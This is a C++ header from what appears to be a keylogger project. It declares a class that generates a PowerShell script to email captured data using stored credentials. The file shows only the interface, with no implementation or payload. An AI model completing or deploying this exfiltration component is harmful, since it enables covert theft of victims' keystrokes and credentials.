#pragma once

#include "FileSystemAccess.h"
#include "Mail.h"
#include "Credentials.h"
#include <memory>

namespace keylogger::mail
{
class PowerShellSendMailScriptCreator
{
public:
    PowerShellSendMailScriptCreator(std::shared_ptr<FileSystemAccess>);

    bool createScript(const Mail&, const Credentials&);
    std::string getScriptFilePath() const;

private:
    std::string constructFormattedScriptBody(const Mail&, const Credentials&);

    std::shared_ptr<FileSystemAccess> fileSystem;

    const std::string scriptName;
    std::string scriptAbsoluteFilePath;
};
}